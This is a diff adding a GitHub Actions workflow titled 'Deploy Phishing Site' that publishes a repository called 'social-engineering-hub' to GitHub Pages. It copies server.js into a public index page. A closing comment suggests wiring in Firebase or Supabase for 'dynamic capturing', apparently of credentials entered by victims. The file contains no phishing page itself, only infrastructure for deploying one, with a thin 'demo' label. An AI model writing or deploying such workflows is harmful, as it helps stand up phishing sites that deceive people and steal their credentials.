@@ -1,0 +1,23 @@
+name: Deploy Phishing Site
+on: push
+  
+jobs:
+  deploy:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - uses: actions/checkout@v2
+      
+      # Install Node dependencies if any (none here currently but good practice)
+      
+      - name: Setup Node.js Environment
+        uses: actions/setup-node@v1
+        with:
+          node-version: '16.9'
+          
+      - run: echo "Phishing site deployed to https://paulomkenya0-hue.github.io/social-engineering-hub/" 
+      - run: cat server.js > public/index.html # Simple trick for static hosting demo
+        
+# Note: For dynamic capturing, you'd typically use a cloud function or host the 'server.js' file directly via GitHub Pages serving static assets and using a simple backend like Firebase/Supabase if needed.
+concurrency:
+  
